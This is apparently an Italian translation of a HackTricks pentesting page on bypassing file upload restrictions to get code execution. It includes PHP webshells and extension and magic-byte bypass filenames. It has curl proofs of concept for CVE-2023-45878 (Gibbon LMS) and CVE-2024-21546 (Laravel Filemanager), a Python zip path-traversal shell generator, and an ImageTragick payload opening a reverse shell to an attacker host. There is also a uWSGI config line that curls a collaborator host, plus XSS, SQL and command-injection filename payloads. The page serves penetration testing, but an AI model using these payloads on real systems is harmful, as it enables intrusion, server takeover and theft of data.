# Caricamento file

{{#include ../../banners/hacktricks-training.md}}

## Metodologia Generale per il Caricamento di File

Altre estensioni utili:

- **PHP**: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module_
- **Working in PHPv8**: _.php_, _.php4_, _.php5_, .phtml_, .module_, .inc_, .hphp_, .ctp_
- **ASP**: _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml_
- **Jsp:** _.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action_
- **Coldfusion:** _.cfm, .cfml, .cfc, .dbm_
- **Flash**: _.swf_
- **Perl**: _.pl, .cgi_
- **Erlang Yaws Web Server**: _.yaws_

### Bypass dei controlli sulle estensioni dei file

1. Se applicabile, **controlla** le **estensioni precedenti.** Testale anche usando alcune **lettere maiuscole**: _pHp, .pHP5, .PhAr ..._
2. _Controlla **aggiungere un'estensione valida prima** dell'estensione eseguibile (usa anche le estensioni precedenti):_
- _file.png.php_
- _file.png.Php5_
3. Prova ad aggiungere **caratteri speciali alla fine.** Puoi usare Burp per **bruteforce** tutti i caratteri **ascii** e **Unicode**. (_Nota che puoi anche provare a usare le **estensioni** **menzionate** in precedenza_)
- _file.php%20_
- _file.php%0a_
- _file.php%00_
- _file.php%0d%0a_
- _file.php/_
- _file.php.\\_
- _file._
- _file.php...._
- _file.pHp5...._
4. Prova a bypassare le protezioni **ingannando il parser delle estensioni** lato server con tecniche come il **doppio** dell'**estensione** o **aggiungendo junk** (byte **null**) tra le estensioni. _Puoi anche usare le **estensioni precedenti** per preparare un payload migliore._
- _file.png.php_
- _file.png.pHp5_
- _file.php#.png_
- _file.php%00.png_
- _file.php\x00.png_
- _file.php%0a.png_
- _file.php%0d%0a.png_
- _file.phpJunk123png_
5. Aggiungi **un ulteriore layer di estensioni** al controllo precedente:
- _file.png.jpg.php_
- _file.php%00.png%00.jpg_
6. Prova a mettere l'**estensione eseguibile prima** di quella valida e spera che il server sia malconfigurato. (utile per sfruttare misconfigurazioni Apache dove qualsiasi cosa con estensione **_.php_**, anche se non termina necessariamente con .php, eseguirà codice):
- _ex: file.php.png_
7. Uso delle **NTFS alternate data stream (ADS)** in **Windows**. In questo caso, verrà inserito un carattere due punti ":" dopo un'estensione proibita e prima di una permessa. Di conseguenza, verrà creato sul server un **file vuoto con l'estensione proibita** (es. "file.asax:.jpg"). Questo file potrebbe essere modificato successivamente usando altre tecniche come l'uso del suo short filename. Anche il pattern "**::$data**” può essere utilizzato per creare file non vuoti. Pertanto, aggiungere un punto dopo questo pattern potrebbe essere utile per bypassare ulteriori restrizioni (es. "file.asp::$data.”)
8. Prova a rompere i limiti del nome file. L'estensione valida viene troncata. E il PHP malevolo resta. AAA<--SNIP-->AAA.php

```
# Linux maximum 255 bytes
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4 # minus 4 here and adding .png
# Upload the file and check response how many characters it alllows. Let's say 236
python -c 'print "A" * 232'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# Make the payload
AAA<--SNIP 232 A-->AAA.php.png
```

#### UniSharp Laravel Filemanager pre-2.9.1 (.php. trailing dot) – CVE-2024-21546

Alcuni upload handler rimuovono o normalizzano i caratteri punto finali dal nome file salvato. In UniSharp’s Laravel Filemanager (unisharp/laravel-filemanager) versioni precedenti alla 2.9.1, puoi bypassare la validazione delle estensioni:

- Usare un MIME valido per immagini e header magic validi (es., l'intestazione PNG `\x89PNG\r\n\x1a\n`).
- Nominare il file uploadato con un'estensione PHP seguita da un punto, es.: `shell.php.`.
- Il server toglie il punto finale e persiste `shell.php`, che verrà eseguito se posizionato in una directory servita dal web (storage pubblico di default come `/storage/files/`).

PoC minimo (Burp Repeater):
```http
POST /profile/avatar HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="upload"; filename="0xdf.php."
Content-Type: image/png

\x89PNG\r\n\x1a\n<?php system($_GET['cmd']??'id'); ?>
------WebKitFormBoundary--
```
Quindi fai una richiesta al percorso salvato (tipico in Laravel + LFM):
```
GET /storage/files/0xdf.php?cmd=id
```
Mitigazioni:
- Aggiornare unisharp/laravel-filemanager a ≥ 2.9.1.
- Enforce strict server-side allowlists e re-validate il persisted filename.
- Servire gli uploads da percorsi non eseguibili.

### Bypass Content-Type, Magic Number, Compression & Resizing

- Bypass **Content-Type** checks impostando il **value** dell'**header** **Content-Type** su: _image/png_ , _text/plain , application/octet-stream_
1. Content-Type **wordlist**: [https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt)
- Bypass **magic number** check aggiungendo all'inizio del file i **bytes of a real image** (confondere il comando _file_). Oppure introdurre la shell nei **metadata**:\
`exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg`\
`\` oppure puoi anche **introdurre il payload direttamente** in un'immagine:\
`echo '<?php system($_REQUEST['cmd']); ?>' >> img.png`
- Se alla tua immagine viene applicata una **compression**, per esempio usando librerie PHP standard come [PHP-GD](https://www.php.net/manual/fr/book.image.php), le tecniche precedenti non saranno utili. Tuttavia, puoi usare il **PLTE chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) per inserire del testo che **sopravvive alla compressione**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_plte_png.php)
- La pagina web potrebbe anche essere **resizing** l'**image**, usando per esempio le funzioni PHP-GD `imagecopyresized` o `imagecopyresampled`. Tuttavia, puoi usare il **IDAT chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) per inserire del testo che **sopravvive alla compressione**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_idat_png.php)
- Un'altra tecnica per creare un payload che **survives an image resizing**, usando la funzione PHP-GD `thumbnailImage`. Tuttavia, puoi usare il **tEXt chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) per inserire del testo che **sopravvive alla compressione**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_tEXt_png.php)

### Other Tricks to check

- Trova una vulnerabilità che permetta di **rename** il file già uploaded (per cambiarne l'estensione).
- Trova una vulnerabilità di **Local File Inclusion** per eseguire il backdoor.
- **Possible Information disclosure**:
1. Upload **several times** (e **at the same time**) lo **stesso file** con lo **stesso name**
2. Upload un file con il **name** di un **file** o **folder** che **already exists**
3. Uploading un file con **"." , "..", or "…" as its name**. Per esempio, in Apache su **Windows**, se l'applicazione salva gli uploaded files nella directory "/www/uploads/", il filename "." creerà un file chiamato uploads” nella directory "/www/".
4. Upload un file che può non essere facilmente cancellato come **"…:.jpg"** in **NTFS**. (Windows)
5. Upload un file in **Windows** con **invalid characters** come `|<>*?”` nel suo nome. (Windows)
6. Upload un file in **Windows** usando **reserved** (**forbidden**) **names** come CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, COM9, LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8, e LPT9.
- Prova anche a **upload an executable** (.exe) o un **.html** (meno sospetto) che **will execute code** quando viene accidentalmente aperto dalla vittima.

### Special extension tricks

Se stai cercando di uploadare file su un **PHP server**, [take a look at the **.htaccess** trick to execute code](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/php-tricks-esp/index.html#code-execution).\
Se stai cercando di uploadare file su un **ASP server**, [take a look at the **.config** trick to execute code](../../network-services-pentesting/pentesting-web/iis-internet-information-services.md#execute-config-files).

I file `.phar` sono come i `.jar` per java, ma per php, e possono essere **used like a php file** (eseguirli con php, o includerli dentro uno script...).

L'estensione `.inc` è talvolta usata per file php che vengono usati solo per **import files**, quindi, a un certo punto, qualcuno potrebbe aver permesso **this extension to be executed**.

## **Jetty RCE**

Se puoi caricare un file XML in un server Jetty puoi ottenere [RCE because **new *.xml and *.war are automatically processed**](https://twitter.com/ptswarm/status/1555184661751648256/photo/1)**.** Quindi, come mostrato nell'immagine seguente, uploada il file XML in `$JETTY_BASE/webapps/` e aspetta la shell!

![https://twitter.com/ptswarm/status/1555184661751648256/photo/1](<../../images/image (1047).png>)

## **uWSGI RCE**

Per un'esplorazione dettagliata di questa vulnerabilità controlla la ricerca originale: [uWSGI RCE Exploitation](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html).

Remote Command Execution (RCE) vulnerabilities possono essere sfruttate in server uWSGI se si ha la possibilità di modificare il file di configurazione `.ini`. I file di configurazione uWSGI usano una sintassi specifica per incorporare variabili "magiche", placeholder e operatori. In particolare, l'operatore '@', utilizzato come `@(filename)`, è pensato per includere il contenuto di un file. Tra i vari schemes supportati in uWSGI, lo scheme "exec" è particolarmente potente, permettendo la lettura dei dati dall'output standard di un processo. Questa funzionalità può essere manipolata per scopi nefasti come Remote Command Execution o Arbitrary File Write/Read quando viene processato un file di configurazione `.ini`.

Considera il seguente esempio di un file `uwsgi.ini` dannoso, che mostra vari schemes:
```ini
[uwsgi]
; read from a symbol
foo = @(sym://uwsgi_funny_function)
; read from binary appended data
bar = @(data://[REDACTED])
; read from http
test = @(http://[REDACTED])
; read from a file descriptor
content = @(fd://[REDACTED])
; read from a process stdout
body = @(exec://whoami)
; curl to exfil via collaborator
extra = @(exec://curl http://collaborator-unique-host.oastify.com)
; call a function returning a char *
characters = @(call://uwsgi_func)
```
L'esecuzione del payload avviene durante il parsing del file di configurazione. Perché la configurazione venga attivata e parsata, il processo uWSGI deve essere riavviato (potenzialmente dopo un crash o a causa di un attacco Denial of Service) oppure il file deve essere impostato su auto-reload. La funzionalità auto-reload, se abilitata, ricarica il file a intervalli specificati quando rileva modifiche.

È cruciale comprendere la natura permissiva del parsing del file di configurazione di uWSGI. Nello specifico, il payload discusso può essere inserito in un file binario (ad esempio un'immagine o un PDF), ampliando ulteriormente la portata dei possibili sfruttamenti.

### Gibbon LMS arbitrary file write to pre-auth RCE (CVE-2023-45878)

Un endpoint non autenticato in Gibbon LMS permette arbitrary file write all'interno della web root, portando a pre-auth RCE inserendo un file PHP. Versioni vulnerabili: fino e compresa la 25.0.01.

- Endpoint: `/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php`
- Method: POST
- Required params:
- `img`: data-URI-like string: `[mime];[name],[base64]` (il server ignora type/name, decodifica in base64 la parte finale)
- `path`: destination filename relative to Gibbon install dir (e.g., `poc.php` or `0xdf.php`)
- `gibbonPersonID`: è accettato qualsiasi valore non vuoto (e.g., `0000000001`)

Minimal PoC to write and read back a file:
```bash
# Prepare test payload
printf '0xdf was here!' | base64
# => MHhkZiB3YXMgaGVyZSEK

# Write poc.php via unauth POST
curl http://target/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php \
-d 'img=image/png;test,MHhkZiB3YXMgaGVyZSEK&path=poc.php&gibbonPersonID=0000000001'

# Verify write
curl http://target/Gibbon-LMS/poc.php
```
Carica una webshell minimale ed esegui comandi:
```bash
# '<?php system($_GET["cmd"]); ?>' base64
# PD9waHAgIHN5c3RlbSgkX0dFVFsiY21kIl0pOyA/Pg==

curl http://target/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php \
-d 'img=image/png;foo,PD9waHAgIHN5c3RlbSgkX0dFVFsiY21kIl0pOyA/Pg==&path=shell.php&gibbonPersonID=0000000001'

curl 'http://target/Gibbon-LMS/shell.php?cmd=whoami'
```
Note:
- Il handler esegue `base64_decode($_POST["img"])` dopo aver splittato per `;` e `,`, poi scrive i byte in `$absolutePath . '/' . $_POST['path']` senza validare extension/type.
- Il codice risultante viene eseguito come l'utente del web service (e.g., XAMPP Apache on Windows).

Le referenze per questo bug includono l'advisory usd HeroLab e la voce NVD. Vedi la sezione References qui sotto.

## **wget File Upload/SSRF Trick**

In alcune occasioni potresti trovare che un server sta usando **`wget`** per **download files** e puoi **indicare** l'**URL**. In questi casi, il codice può verificare che l'estensione dei file scaricati sia presente in una whitelist per assicurarsi che vengano scaricati solo file consentiti. Tuttavia, **this check can be bypassed.**\
La **maximum** length di un **filename** in **linux** è **255**, tuttavia, **wget** tronca i filename a **236** caratteri. You can **download a file called "A"*232+".php"+".gif"**, questo filename will **bypass** the **check** (as in this example **".gif"** è un'estensione **valid**) ma `wget` rinominerà il file in **"A"*232+".php"**.
```bash
#Create file and HTTP server
echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080
```

```bash
#Download the file
wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 [image/gif]
Saving to: ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s

2020-06-13 03:14:06 (1.96 MB/s) - ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’ saved [10/10]
```
Note that **un'altra opzione** a cui potresti pensare per bypassare questo controllo è far sì che il **HTTP server effettui un redirect verso un file diverso**, così l'URL iniziale supererà il controllo e poi wget scaricherà il file reindirizzato con il nuovo nome. Questo **non funzionerà** **a meno che** wget non venga usato con il **parametro** `--trust-server-names` perché **wget scaricherà la pagina reindirizzata con il nome del file indicato nell'URL originale**.

### Escaping upload directory via NTFS junctions (Windows)

(Per questo attacco avrai bisogno di accesso locale alla macchina Windows) Quando gli upload vengono memorizzati in sottocartelle per utente su Windows (e.g., C:\Windows\Tasks\Uploads\<id>\) e controlli la creazione/eliminazione di quella sottocartella, puoi sostituirla con una directory junction che punti a una posizione sensibile (e.g., il webroot). Gli upload successivi verranno scritti nel percorso di destinazione, consentendo l'esecuzione di codice se il target interpreta codice lato server.

Esempio di flusso per reindirizzare gli upload nella XAMPP webroot:
```cmd
:: 1) Upload once to learn/confirm your per-user folder name (e.g., md5 of form fields)
::    Observe it on disk: C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882

:: 2) Remove the created folder and create a junction to webroot
rmdir C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882
cmd /c mklink /J C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882 C:\xampp\htdocs

:: 3) Re-upload your payload; it lands under C:\xampp\htdocs
::    Minimal PHP webshell for testing
::    <?php echo shell_exec($_REQUEST['cmd']); ?>

:: 4) Trigger
curl "http://TARGET/shell.php?cmd=whoami"
```
Note
- mklink /J creates an NTFS directory junction (reparse point). L'account del web server deve seguire la junction e avere permesso di scrittura nella destinazione.
- This redirects arbitrary file writes; if the destination executes scripts (PHP/ASP), this becomes RCE.
- Contromisure: non consentire che le writable upload roots siano controllabili dall'attaccante sotto C:\Windows\Tasks o simili; bloccare la creazione di junction; validare le estensioni lato server; memorizzare gli upload su un volume separato o con deny‑execute ACLs.

## Tools

- [Upload Bypass](https://github.com/sAjibuu/Upload_Bypass) è un potente tool progettato per assistere Pentesters and Bug Hunters nel testing dei meccanismi di file upload. Sfrutta varie tecniche di bug bounty per semplificare il processo di identificazione e sfruttamento delle vulnerabilità, garantendo valutazioni approfondite delle web applications.

### Corrupting upload indices with snprintf quirks (historical)

Alcuni legacy upload handler che usano `snprintf()` o simili per costruire array multi-file da un singolo upload possono essere ingannati nel falsificare la struttura `_FILES`. A causa di incoerenze e troncamenti nel comportamento di `snprintf()`, un singolo upload appositamente costruito può apparire come più file indicizzati sul lato server, confondendo la logica che assume una forma fissa (ad es. trattandolo come un multi-file upload e prendendo branch non sicuri). Sebbene oggi sia di nicchia, questo pattern di “index corruption” ricompare occasionalmente in CTFs e codebase più vecchie.

## From File upload to other vulnerabilities

- Imposta **filename** su `../../../tmp/lol.png` e prova a ottenere una **path traversal**
- Imposta **filename** su `sleep(10)-- -.jpg` e potresti riuscire a ottenere una **SQL injection**
- Imposta **filename** su `<svg onload=alert(document.domain)>` per ottenere una **XSS**
- Imposta **filename** su `; sleep 10;` per testare qualche command injection (maggiori informazioni: [command injections tricks here](../command-injection.md))
- [**XSS** in image (svg) file upload](../xss-cross-site-scripting/index.html#xss-uploading-files-svg)
- **JS** file **upload** + **XSS** = [**Service Workers** exploitation](../xss-cross-site-scripting/index.html#xss-abusing-service-workers)
- [**XXE in svg upload**](../xxe-xee-xml-external-entity.md#svg-file-upload)
- [**Open Redirect** via uploading svg file](../open-redirect.md#open-redirect-uploading-svg-files)
- Prova **different svg payloads** da [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)
- [Famous **ImageTrick** vulnerability](https://mukarramkhalid.com/imagemagick-imagetragick-exploit/)
- Se puoi far sì che il web server recuperi un'immagine da una URL, potresti provare ad abusare di una [SSRF](../ssrf-server-side-request-forgery/index.html). Se questa immagine viene salvata in un sito pubblico, puoi anche indicare una URL da [https://iplogger.org/invisible/](https://iplogger.org/invisible/) e rubare informazioni di ogni visitatore.
- [**XXE and CORS** bypass with PDF-Adobe upload](pdf-upload-xxe-and-cors-bypass.md)
- PDF appositamente creati per XSS: la [pagina seguente presenta come **inject PDF data to obtain JS execution**](../xss-cross-site-scripting/pdf-injection.md). Se puoi uploadare PDF potresti preparare un PDF che esegua JS arbitrario seguendo le indicazioni fornite.
- Carica il contenuto di \[eicar]\([**https://secure.eicar.org/eicar.com.txt**](https://secure.eicar.org/eicar.com.txt)) per verificare se il server ha qualche **antivirus**
- Verifica se esiste un **limite di dimensione** nel caricamento dei file

Ecco una top 10 di cose che puoi ottenere caricando (da [here](https://twitter.com/SalahHasoneh1/status/1281274120395685889)):

1. **ASP / ASPX / PHP5 / PHP / PHP3**: Webshell / RCE
2. **SVG**: Stored XSS / SSRF / XXE
3. **GIF**: Stored XSS / SSRF
4. **CSV**: CSV injection
5. **XML**: XXE
6. **AVI**: LFI / SSRF
7. **HTML / JS** : HTML injection / XSS / Open redirect
8. **PNG / JPEG**: Pixel flood attack (DoS)
9. **ZIP**: RCE via LFI / DoS
10. **PDF / PPTX**: SSRF / BLIND XXE

#### Burp Extension


{{#ref}}
https://github.com/portswigger/upload-scanner
{{#endref}}

## Magic Header Bytes

- **PNG**: `"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\x s0\x03["`
- **JPG**: `"\xff\xd8\xff"`

Refer to [https://en.wikipedia.org/wiki/List_of_file_signatures](https://en.wikipedia.org/wiki/List_of_file_signatures) for other filetypes.

## Zip/Tar File Automatically decompressed Upload

If you can upload a ZIP that is going to be decompressed inside the server, you can do 2 things:

### Symlink

Carica un archivio contenente symlink a altri file; poi, accedendo ai file decompressi accederai ai file a cui puntano i symlink:
```
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
tar -cvf test.tar symindex.txt
```
### Decomprimere in cartelle diverse

La creazione inaspettata di file in directory durante la decompressione è un problema significativo. Nonostante le ipotesi iniziali che questa configurazione potesse proteggere contro OS-level command execution tramite upload di file malevoli, il hierarchical compression support e le capacità di directory traversal del formato di archivio ZIP possono essere sfruttate. Questo permette agli attackers di bypassare le restrizioni ed evadere le secure upload directories manipolando la decompression functionality dell'applicazione target.

Un automated exploit per creare tali file è disponibile su [**evilarc on GitHub**](https://github.com/ptoomey3/evilarc). L'utility può essere usata come mostrato:
```python
# Listing available options
python2 evilarc.py -h
# Creating a malicious archive
python2 evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
```
Inoltre, il **symlink trick with evilarc** è un'opzione. Se l'obiettivo è puntare a un file come `/flag.txt`, dovrebbe essere creato un symlink a quel file sul tuo sistema. Questo garantisce che evilarc non incontri errori durante la sua esecuzione.

Di seguito è riportato un esempio di codice Python utilizzato per creare un file zip dannoso:
```python
#!/usr/bin/python
import zipfile
from io import BytesIO


def create_zip():
f = BytesIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
z.writestr('../../../../../var/www/html/webserver/shell.php', '<?php echo system($_REQUEST["cmd"]); ?>')
z.writestr('otherfile.xml', 'Content of the file')
z.close()
zip = open('poc.zip','wb')
zip.write(f.getvalue())
zip.close()

create_zip()
```
**Abusare della compressione per file spraying**

Per maggiori dettagli **controlla il post originale su**: [https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/](https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/)

1.  **Creating a PHP Shell**: Il codice PHP è scritto per eseguire comandi passati tramite la variabile `$_REQUEST`.

```php
<?php
if(isset($_REQUEST['cmd'])){
$cmd = ($_REQUEST['cmd']);
system($cmd);
}?>
```

2.  **File Spraying and Compressed File Creation**: Vengono creati più file e viene assemblato un archivio zip contenente questi file.

```bash
root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
root@s2crew:/tmp# zip cmd.zip xx*.php
```

3.  **Modification with a Hex Editor or vi**: I nomi dei file all'interno dello zip vengono alterati usando vi o un hex editor, cambiando "xxA" in "../" per attraversare le directory.

```bash
:set modifiable
:%s/xxA/../g
:x!
```

## ImageTragic

Carica questo contenuto con un'estensione immagine per sfruttare la vulnerabilità **(ImageMagick , 7.0.1-1)** (dal [exploit](https://www.exploit-db.com/exploits/39767))
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```
## Incorporare una PHP shell in un PNG

Incorporare una PHP shell nello IDAT chunk di un file PNG può aggirare efficacemente alcune operazioni di elaborazione delle immagini. Le funzioni `imagecopyresized` e `imagecopyresampled` di PHP-GD sono particolarmente rilevanti in questo contesto, in quanto vengono comunemente utilizzate rispettivamente per ridimensionare e risamplare le immagini. La capacità della PHP shell incorporata di rimanere inalterata da queste operazioni è un vantaggio significativo in alcuni casi d'uso.

Una trattazione dettagliata di questa tecnica, inclusa la metodologia e le potenziali applicazioni, è fornita nel seguente articolo: ["Encoding Web Shells in PNG IDAT chunks"](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/). Questa risorsa offre una comprensione completa del processo e delle sue implicazioni.

Ulteriori informazioni in: [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

## File polyglot

I file polyglot fungono da strumento unico in cybersecurity, comportandosi come camaleonti che possono esistere validamente in più formati di file simultaneamente. Un esempio interessante è un [GIFAR](https://en.wikipedia.org/wiki/Gifar), un ibrido che funziona sia come GIF sia come archivio RAR. Questi file non sono limitati a questa combinazione; sono possibili anche accoppiamenti come GIF e JS o PPT e JS.

L'utilità principale dei polyglot risiede nella loro capacità di eludere misure di sicurezza che filtrano i file in base al tipo. Una prassi comune in molte applicazioni consiste nel permettere solo determinati tipi di file in upload — come JPEG, GIF o DOC — per mitigare il rischio di formati potenzialmente dannosi (es. JS, PHP, o Phar). Tuttavia, un polyglot, conformandosi ai criteri strutturali di più formati, può aggirare silenziosamente queste restrizioni.

Nonostante la loro adattabilità, i polyglot incontrano delle limitazioni. Per esempio, mentre un polyglot potrebbe incarnare simultaneamente un file PHAR e un JPEG, il successo dell'upload potrebbe dipendere dalla politica sulle estensioni del sistema. Se la piattaforma è rigorosa riguardo le estensioni ammesse, la sola dualità strutturale di un polyglot potrebbe non essere sufficiente per garantire l'upload.

Ulteriori informazioni in: [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)

### Caricare JSON validi come se fossero PDF

Come evitare il rilevamento del tipo di file caricando un file JSON valido anche se non consentito, fingendo che sia un PDF (tecniche da **[this blog post](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)**):

- **`mmmagic` library**: Finché i magic bytes `%PDF` sono nei primi 1024 byte è considerato valido (vedi esempio nel post)
- **`pdflib` library**: Aggiungi un finto formato PDF dentro un campo del JSON in modo che la libreria pensi sia un PDF (vedi esempio nel post)
- **`file` binary**: Il binario `file` può leggere fino a 1048576 byte da un file. Crea un JSON più grande di tale dimensione in modo che non possa analizzarlo come JSON e poi inserisci, all'interno del JSON, la parte iniziale di un PDF reale e lo considererà un PDF

## Riferimenti

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files)
- [https://github.com/modzero/mod0BurpUploadScanner](https://github.com/modzero/mod0BurpUploadScanner)
- [https://github.com/almandin/fuxploider](https://github.com/almandin/fuxploider)
- [https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)
- [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
- [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)
- [https://blog.doyensec.com/2025/01/09/cspt-file-upload.html](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)
- [usd HeroLab – Gibbon LMS arbitrary file write (CVE-2023-45878)](https://herolab.usd.de/security-advisories/usd-2023-0025/)
- [NVD – CVE-2023-45878](https://nvd.nist.gov/vuln/detail/CVE-2023-45878)
- [0xdf – HTB: TheFrizz](https://0xdf.gitlab.io/2025/08/23/htb-thefrizz.html)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)
- [CVE-2024-21546 – NVD entry](https://nvd.nist.gov/vuln/detail/CVE-2024-21546)
- [PoC gist for LFM .php. bypass](https://gist.github.com/ImHades101/338a06816ef97262ba632af9c78b78ca)
- [0xdf – HTB Environment (UniSharp LFM upload → PHP RCE)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [Microsoft – mklink (command reference)](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)

{{#include ../../banners/hacktricks-training.md}}
